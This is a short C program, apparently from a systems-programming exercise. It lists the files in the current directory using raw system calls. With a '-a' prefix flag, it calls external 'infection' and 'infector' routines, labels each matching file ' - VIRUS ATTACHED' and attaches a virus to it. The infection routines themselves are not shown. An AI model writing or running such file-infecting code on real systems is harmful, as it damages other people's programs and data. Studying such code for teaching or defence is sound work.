#include "util.h" 

#define STDOUT 1
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LSEEK 19
#define SYS_EXIT 1
#define STDIN 0
#define SYS_GETDENTS 141



extern void infector();
extern void infection();

typedef struct dirent
{
	int inodeNum;
	int offset;
	short len;
	char buf[1];
} dirent;



int main(int argc, char **argv)
{
    infection(2);
    int aFlag = 0;
    char *prefix = "";
    int i=0;
    for(i=0;i<argc;i++){
        

        if(strncmp("-a",argv[i],2) == 0){
            aFlag = 1;
            prefix=argv[i]+2;
        }

    }

    char buffer[8192];
    int fp = system_call(SYS_OPEN, ".", 0, 0700);
    int read_count = system_call(SYS_GETDENTS, fp, buffer, 8192);
    dirent *dir = (dirent *)buffer;

    
    i=0;
    while(i<read_count){
        dir = (struct dirent *)(buffer+i);
        if(dir->buf[0]!='.'){
                system_call(SYS_WRITE,STDOUT,dir->buf,strlen(dir->buf));
                if(aFlag==1){
                    if (strncmp(prefix,dir->buf,strlen(prefix)) == 0){
                        system_call(SYS_WRITE,STDOUT," - VIRUS ATTACHED",18);
                        infector(dir->buf);
                    }
                }  
                system_call(SYS_WRITE,STDOUT,"\n",1);
            }
            i=i+dir->len;
        }
    return 0;     
    }
    
